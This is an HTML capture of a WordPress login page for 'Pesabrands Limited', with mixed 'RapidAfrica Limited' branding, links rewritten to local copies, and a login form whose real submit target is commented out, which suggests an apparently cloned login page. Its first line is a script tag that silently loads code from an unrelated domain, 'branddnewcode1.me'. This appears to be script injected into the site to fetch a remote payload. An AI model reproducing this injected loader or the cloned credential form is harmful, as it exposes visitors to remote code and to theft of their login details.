...
<script type="text/javascript" src="https://branddnewcode1.me/code/gy3dknzugy5ha3ddf44donq" async></script>
	...
	<meta name="apple-mobile-web-app-title" content="Pesabrands Limited">
	<meta name="application-name" content="Pesabrands Limited">
	...
	<title>Login &bull; RapidAfrica Limited</title>
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="index.html" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Login &bull; Pesabrands Limited" />
	<meta property="og:url" content="https://user.pesabrands.com/login/" />
	<meta property="og:site_name" content="Pesabrands Limited" />
	<meta property="article:modified_time" content="2020-06-26T09:06:36+00:00" />
...
<link rel="alternate" type="application/rss+xml" title="PesaRapidAfrica  Limited &raquo; Feed" href="../feed/index.html" />
...
<link rel="alternate" type="application/rss+xml" title="RapidAfrica Limited &raquo; Login Comments Feed" href="feed/index.html" />
...
{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/user.pesabrands.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":3553,"token":"4554b112d4","lang":0,"debug":0}
</script> -->
...
<link rel="https://api.w.org/" href="../wp-json/index.html" /><link rel="alternate" type="application/json" href="../wp-json/wp/v2/pages/3553" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="../xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.5.10" />
<meta name="generator" content="WooCommerce 4.7.2" />
<link rel='shortlink' href='../indexa272.html?p=3553' />
<link rel="alternate" type="application/json+oembed" href="../wp-json/oembed/1.0/embed4ced?url=https%3A%2F%2Fuser.pesabrands.com%2Flogin%2F" />
<link rel="alternate" type="text/xml+oembed" href="../wp-json/oembed/1.0/embed1128?url=https%3A%2F%2Fuser.pesabrands.com%2Flogin%2F&amp;format=xml" />
...
<body class="bp-legacy page-template-default page page-id-3553 wp-custom-logo wp-embed-responsive theme-cera pmpro-body-has-access woocommerce-no-js yz-red-scheme not-logged-in tribe-no-js grimlock grimlock--fluid grimlock--navigation-fixed-left grimlock--navigation-inside-top grimlock--navigation-fixed grimlock--back-to-top-right grimlock--loader-fadein-displayed grimlock--page grimlock-buddypress--friend-icons-heart grimlock--navigation-login-displayed mobile elementor-default elementor-kit-3850 no-js">
	...
	<div class="form-group">
		...
		<ul class="grimlock-login-navbar_nav_menu vertical-navbar-nav sidebar-nav nav navbar-nav navbar-nav--login nav-pills nav-stacked">
			<li class="menu-item menu-item--login">
					...
					<a href="../register/index.html" class="btn btn-primary">Register</a>
				</li>
					</ul>
			...
			<ul class="nav navbar-nav navbar-nav--buddypress logged-out">
				...
				<li class="menu-item menu-item-has-children ml-0 menu-item--profile has-notifications">
						...
						<a href="../register/index.html" class="menu-item--profile__link d-none d-lg-block ">
						...
						<ul id="menu-user-logged-out" class="sub-menu"><li id="menu-item-108" class="bp-menu bp-login-nav menu-item menu-item-type-custom menu-item-object-custom menu-item-108"><a href="../wp-logind2e1.php?redirect_to=https%3A%2F%2Fuser.pesabrands.com%2Flogin%2F">Log In</a></li>
		...
		<button type="submit" class="search-submit"><i class="fa fa-search"></i></button>
			...
			<ul class="nav navbar-nav navbar-nav--buddypress logged-out">
				...
				<li class="menu-item menu-item-has-children ml-0 menu-item--profile has-notifications">
						...
						<ul id="menu-user-logged-out-1" class="sub-menu"><li class="bp-menu bp-login-nav menu-item menu-item-type-custom menu-item-object-custom menu-item-108"><a href="../wp-logind2e1.php?redirect_to=https%3A%2F%2Fuser.pesabrands.com%2Flogin%2F">Log In</a></li>
<li class="bp-menu bp-register-nav menu-item menu-item-type-custom menu-item-object-custom menu-item-109"><a href="https://intranet.cera-theme.com/register/">Register</a></li>
		...
		<div id="logy" class="logy logy-page-box yz-page">		
        ...
        <div class="logy-form-message logy-error-msg">
                            <p><strong>Error</strong>: The username field is empty.</p>
                            <p><strong>Error</strong>: The password field is empty.</p>
                                </div>
 ...
 -->
			...
			<form id="logy-form" class="logy-login-form" method="post"> <!-- action="https://user.pesabrands.com/wp-login.php"> -->
				...
				<!-- After Form Buttons -->
		    		...
		    		<div class="logy-item-content">
			           				           <div class="logy-field-content">
		           							    		<input type="password" name="password" autocomplete="false" placeholder="Password" value="" required>
			            </div>
		        	</div>
		       	</div>
					...
					<div class="logy-item-inner">
	            		<a href="../register/index.php" class="logy-link-button" >
				...
				<!-- After Form Buttons -->
					...
					<div class="logy-item-inner">
	           			<button type="submit" value="submit"  name="signin_submit"  >
							...
							<div class="logy-action-item logy-link-item">
					<div class="logy-item-inner">
	            		<a href="../register/index.html" class="logy-link-button" >
	            				           				Create New Account	            		</a>
	            	</div>
	            </div>
										</div>
		...
		<form name="loginform" id="loginform" action="https://user.pesabrands.com/wp-login.php" method="post">
			...
			<p class="login-submit">
				...
				<input type="hidden" name="redirect_to" value="https://user.pesabrands.com/login/" />
			</p>
			
		<div class="login-footer">
			<div class="login-register"><a rel="nofollow" href="../register/index.html">Register</a></div><div class="login-lostpassword"><a href="../shop/my-account/lost-password/index.html">Lost your password?</a></div>		</div>
...
<script type='text/javascript' src='../wp-includes/js/comment-reply.min0225.js?ver=5.5.10' id='comment-reply-js'></script>
